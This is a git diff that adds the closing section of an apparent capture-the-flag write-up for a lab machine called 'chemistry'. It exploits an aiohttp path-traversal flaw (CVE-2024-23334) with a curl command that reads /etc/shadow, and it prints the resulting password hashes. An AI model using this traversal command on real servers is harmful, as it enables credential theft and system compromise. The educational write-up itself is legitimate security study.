@@ -220,7 +220,71 @@ _space_group_magn.name_BNS  "P  n'  m  a'  "
 
 ![image](https://github.com/user-attachments/assets/606e9f71-02c3-47cf-b5d7-3bebf3952057)
 
-- This version of `aiohttp` is vulnerable to path traversal as explained [here]()
+- This version of `aiohttp` is vulnerable to path traversal as explained [here](https://github.com/wizarddos/CVE-2024-23334) but I'll be exploiting with `curl`.
+- I was able to read the `/etc/shadow` file.The default directory in this case is `assets`.
+
+```bash
+rosa@chemistry:~$ curl --path-as-is http://127.0.0.1:8080/assets/../../../etc/shadow
+root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
+daemon:*:19430:0:99999:7:::
+bin:*:19430:0:99999:7:::
+sys:*:19430:0:99999:7:::
+sync:*:19430:0:99999:7:::
+games:*:19430:0:99999:7:::
+man:*:19430:0:99999:7:::
+lp:*:19430:0:99999:7:::
+mail:*:19430:0:99999:7:::
+news:*:19430:0:99999:7:::
+uucp:*:19430:0:99999:7:::
+proxy:*:19430:0:99999:7:::
+www-data:*:19430:0:99999:7:::
+backup:*:19430:0:99999:7:::
+list:*:19430:0:99999:7:::
+irc:*:19430:0:99999:7:::
+gnats:*:19430:0:99999:7:::
+nobody:*:19430:0:99999:7:::
+systemd-network:*:19430:0:99999:7:::
+systemd-resolve:*:19430:0:99999:7:::
+systemd-timesync:*:19430:0:99999:7:::
+messagebus:*:19430:0:99999:7:::
+syslog:*:19430:0:99999:7:::
+_apt:*:19430:0:99999:7:::
+tss:*:19430:0:99999:7:::
+uuidd:*:19430:0:99999:7:::
+tcpdump:*:19430:0:99999:7:::
+landscape:*:19430:0:99999:7:::
+pollinate:*:19430:0:99999:7:::
+fwupd-refresh:*:19430:0:99999:7:::
+usbmux:*:19889:0:99999:7:::
+sshd:*:19889:0:99999:7:::
+systemd-coredump:!!:19889::::::
+rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::
+lxd:!:19889::::::
+app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::
+_laurel:!:20007::::::
+```
+
+- Finally,I was able to read the `root` user id_rsa file
+
+![image](https://github.com/user-attachments/assets/6dfb919c-9791-4c0c-a274-c6b6c12b0dc3)
+
+- Root-:
+
+![image](https://github.com/user-attachments/assets/3bcb48cb-9d6e-4875-968f-12161aac14eb)
+
+-----------------
+
+### THANKS FOR READING
+
+----------------
+
+### REFERENCES-:
+
+- [Pytmagen's exploit](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)
+- [Aio/http's POC](https://github.com/wizarddos/CVE-2024-23334)
+
+-----------------
+
 
 
 
